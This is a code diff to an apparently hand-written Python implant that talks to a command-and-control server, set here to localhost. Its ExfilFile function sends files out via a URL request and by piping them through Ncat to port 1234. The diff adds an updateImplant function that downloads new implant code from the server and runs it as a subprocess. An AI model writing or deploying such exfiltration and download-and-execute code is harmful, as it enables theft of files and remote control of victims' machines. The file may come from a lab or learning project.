@@ -2,14 +2,23 @@ import urllib.request
 import urllib
 import os
 import time
+import subprocess
+import sys
 
 #Comms
 c2 = 'http://localhost:443'
 c2IPAdress = 'localhost'
 
+#This will upload a file to the target server.
 def ExfilFile(file, c2, IPAddress):
     urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
     os.system(f'Ncat {IPAddress} 1234 < {file}')
+    return
+
+#This will download the new version of the implant, and then run it as a subprocess.
+def updateImplant():
+    urllib.request.urlretrieve(f'{c2}/updateImplant', "implant.py")
+    subprocess.Popen([sys.executable, "implant.py"])
     return
 
 #initialiazation, this will set establish a Session ID
